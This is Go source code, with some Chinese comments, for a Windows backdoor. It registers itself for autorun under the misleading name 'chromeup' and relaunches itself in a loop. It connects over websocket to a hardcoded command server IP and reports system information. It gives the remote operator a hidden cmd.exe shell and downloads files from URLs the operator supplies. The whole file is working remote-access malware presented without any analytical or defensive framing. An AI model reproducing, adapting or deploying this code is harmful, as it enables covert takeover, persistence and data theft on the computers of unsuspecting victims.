package main

import (
	"fmt"
	"github.com/gorilla/websocket"
	"net"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"github.com/op/go-logging"
	"os"
	"os/exec"
	"syscall"
	"golang.org/x/sys/windows"
	"io"
	"time"
	"bytes"
	"path/filepath"
	"flag"
	"strconv"
	"golang.org/x/sys/windows/registry"
	"net/http"
)

// message 通讯
type wsMessage struct {
	Type	int	   `json:"type,int"`
	Sender  string `json:"sender,omitempty"`
	Target  string `json:"target,omitempty"`
	Param1	string `json:"param1,omitempty"`
	Param2	string `json:"param2,omitempty"`
	Param3	string `json:"param3,omitempty"`
}

//var addr = flag.String("addr", "api.51fengxun.cn", "http service address")
var child = flag.String("c", "", "")
var log = logging.MustGetLogger("goserver")
var format = logging.MustStringFormatter(
	//`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
	`%{time:15:04:05.000} > %{message}`,
)
var connectString = "ws://97.107.137.127:8285"
var groupID = "test"

func getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func getClientId() string {
	clientId := getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

func addReg(filePath string)  {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	// run
	key.SetStringValue("chromeup", filePath)
}

func main() {
	var clientID string
	var clientUID string
	var targetUID string
	var dialer *websocket.Dialer

	if len(connectString)==0 {
		os.Exit(0)
	}

	// init log config
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	// 用户参数
	flag.Parse()

	if *child == "" {
		// add auto run reg
		filePath, _ := filepath.Abs(os.Args[0])
		addReg(filePath)

		for {
			timeStamp := strconv.FormatInt(time.Now().Unix(), 10)
			//args := append([]string{filePath},"-c", timeStamp)
			//proc, err := os.StartProcess(filePath, args, &os.ProcAttr{Files:[]*os.File{os.Stdin,os.Stdout,os.Stderr}})
			//if err != nil {
			//	addReg(err.Error())
			//	os.Exit(0)
			//}
			proc := exec.Command(filePath, "-c", timeStamp)
			proc.Start()
			//log.Debug("child", proc.Process.Pid)
			go func() {
				time.Sleep(time.Duration(30)*time.Minute)
				proc.Process.Kill()
			}()
			proc.Wait()
			//log.Debug("daemon end")
			time.Sleep(time.Duration(1)*time.Minute)
		}
	}

	conn, _, err := dialer.Dial(connectString, nil)
	if err != nil {
		log.Debug(err.Error())
		return
	}

	// get client id
	clientID = getClientId()
	//log.Debug("client id", clientID)

	// 等待服务器返回本次通讯的临时ID
	_, messageData, err := conn.ReadMessage()
	if err != nil {
		log.Debug("read:", err)
		return
	}

	message := &wsMessage{}
	err = json.Unmarshal([]byte(messageData), message)
	if err != nil {
		log.Debug("json error", err.Error())
	}
	if message.Type == 102 {
		clientUID = message.Sender
		log.Debug("login ok")

		// 绑定clientID
		bindClient(conn, clientID)
	} else {
		log.Debug("login error")
		os.Exit(0)
	}

	// live report
	go func() {
		for {
			liveReport(conn, clientID)
			time.Sleep(time.Duration(1)*time.Minute)
		}
	}()

	for {
		//log.Debug("wait...")
		_, messageData, err := conn.ReadMessage()
		if err != nil {
			//log.Debug("read:", err)
			return
		}

		message := &wsMessage{}
		err = json.Unmarshal([]byte(messageData), message)
		if err != nil {
			log.Debug("json error", err.Error())
		}
		//log.Debug(message.Type)

		targetUID = message.Sender
		switch message.Type {
		case 103:
			if message.Param1 == "sh" {
				go execMessage(targetUID)
			}
		case 105:
			//log.Debug("get systeminfo")
			systeminfo := systemInfo()
			message := &wsMessage{
				Type:	105,
				Sender: clientUID,
				Target: targetUID,
				Param1: clientID,
				Param2: systeminfo,
			}

			sendData, _ := json.Marshal(message)
			conn.WriteMessage(websocket.TextMessage, sendData)
		default:
			log.Debug("unkonwn")
		}
	}
}

func liveReport(conn *websocket.Conn, clientID string)  {
	message := &wsMessage{
		Type:	100,
		Sender: clientID,
		Target: clientID,
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)
}

func bindClient(conn *websocket.Conn, clientID string)  {
	//log.Debug("bind", clientID)
	message := &wsMessage{
		Type:	102,
		Sender: clientID,
		Param1: groupID,
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)
}

func systemInfo() string {
	cmd := exec.Command("systeminfo.exe", "/fo", "csv")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	return out.String()
}

func execMessage(targetUID string) error {
	// 连接websocket
	var dialer *websocket.Dialer

	conn, _, err := dialer.Dial(connectString, nil)
	if err != nil {
		fmt.Println(err)
		return err
	}

	// 等待服务器返回本次通讯的临时ID
	_, messageData, err := conn.ReadMessage()
	if err != nil {
		log.Debug("read:", err)
		return err
	}

	message := &wsMessage{}
	err = json.Unmarshal([]byte(messageData), message)
	if err != nil {
		log.Debug("json error", err.Error())
	}
	clientUID := message.Sender
	//log.Debug("cmdshell", clientUID)

	// 把clientID返回给远端
	message = &wsMessage{
		Type:	101,
		Sender: clientUID,
		Target: targetUID,
	}

	sendData, _ := json.Marshal(message)
	conn.WriteMessage(websocket.TextMessage, sendData)

	//log.Debug("exec message", inputId)
	cmdShell := exec.Command("cmd.exe")
	cmdShell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: windows.STARTF_USESTDHANDLES,
	}

	ppReader, err := cmdShell.StdoutPipe()
	defer ppReader.Close()
	if err != nil {
		log.Debug("create read pipe error", err.Error())
	}

	ppWriter, err := cmdShell.StdinPipe()
	defer ppWriter.Close()
	if err != nil {
		log.Debug("create write pipe error", err.Error())
	}

	if err := cmdShell.Start(); err != nil {
		return err
	}

	// pipeReader
	go func() {
		buffer := make([]byte, 10240)

		for {
			// 从管道读取数据
			n, err := ppReader.Read(buffer)
			if err != nil {
				if err == io.EOF {
					log.Debug("pipi has closed")
					break
				} else {
					log.Debug("read content failed")
					break
				}
			}

			// 发送数据
			message = &wsMessage{
				Type:	201,
				Sender: clientUID,
				Target: targetUID,
				Param1: string(buffer[:n]),
			}

			sendData, _ := json.Marshal(message)
			conn.WriteMessage(websocket.TextMessage, sendData)
		}
	}()

	// pipeWriter
	go func() {
		for {
			_, messageData, err := conn.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				return
			}

			message := &wsMessage{}
			err = json.Unmarshal([]byte(messageData), message)
			if err != nil {
				log.Debug("json error", err.Error())
			}
			//log.Debug("recv", message.Type)
			if message.Type == 201 {
				// 写入管道
				//log.Debug(message.Param1)
				ppWriter.Write([]byte(message.Param1))
			} else if message.Type == 202 {
				// 下载文件
				URL := message.Param1
				filename := message.Param2
				msg := "download " + URL
				err := download(URL, filename)
				if err == nil {
					msg += " OK"
				} else {
					msg += " error:" + err.Error()
				}

				// 返回结果
				message = &wsMessage{
					Type:	201,
					Sender: clientUID,
					Target: targetUID,
					Param1: msg,
				}

				sendData, _ := json.Marshal(message)
				conn.WriteMessage(websocket.TextMessage, sendData)
			}
		}
	}()

	time.Sleep(time.Duration(6)*time.Hour)
	return nil
}

func download(url string, filename string) error {
	res, err := http.Get(url)
	if err != nil {
		return err
	}
	f, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
	if err != nil {
		return err
	}
	io.Copy(f, res.Body)
	res.Body.Close()
	f.Close()

	return nil
}